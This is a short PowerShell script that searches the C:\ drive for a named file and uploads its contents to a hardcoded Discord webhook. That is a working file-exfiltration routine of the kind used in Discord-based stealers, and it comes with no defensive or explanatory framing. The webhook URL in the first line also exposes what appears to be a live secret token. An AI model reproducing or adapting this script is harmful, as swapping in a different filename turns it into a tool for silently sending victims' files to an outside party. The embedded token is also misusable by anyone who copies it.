# Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1149830168903438358/9Doq-cehv0fkinqLVAg3wrGdtpNqCs0j8rM_OEuh1PQn6B8EstGbTZF8QGwsyT4sqVxS"

# Directory to search for the file
$searchDirectory = "C:\"

# File name to search for
$fileName = "hello.txt"

try {
    # Search for the file by name
    $fileToUpload = Get-ChildItem -Path $searchDirectory -Filter $fileName -File -ErrorAction Stop | Select-Object -First 1

    # Read the file content
    $fileContent = Get-Content -Path $fileToUpload.FullName -Raw

    # Create the boundary for the multipart form data
    $boundary = [System.Guid]::NewGuid().ToString()

    # Construct the multipart form data body
    $bodyLines = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$($fileToUpload.Name)"
Content-Type: text/plain

$fileContent
--$boundary--
"@

    # Convert the body to a byte array
    $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($bodyLines)

    # Construct the web request
    $webRequest = [System.Net.HttpWebRequest]::Create($webhookUrl)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
    $webRequest.ContentLength = $bodyBytes.Length

    # Write the body to the request stream
    $requestStream = $webRequest.GetRequestStream()
    $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
    $requestStream.Close()

    # Get the response
    $response = $webRequest.GetResponse()
    $responseStream = $response.GetResponseStream()
    $responseReader = New-Object System.IO.StreamReader($responseStream)
    $responseContent = $responseReader.ReadToEnd()

    # Debugging output
    Write-Output "Response content: $responseContent"

    # Clean up
    $responseReader.Close()
    $responseStream.Close()
    $response.Close()
} catch {
    # Catch and display any errors
    Write-Output "Error sending multipart content: $_"
}
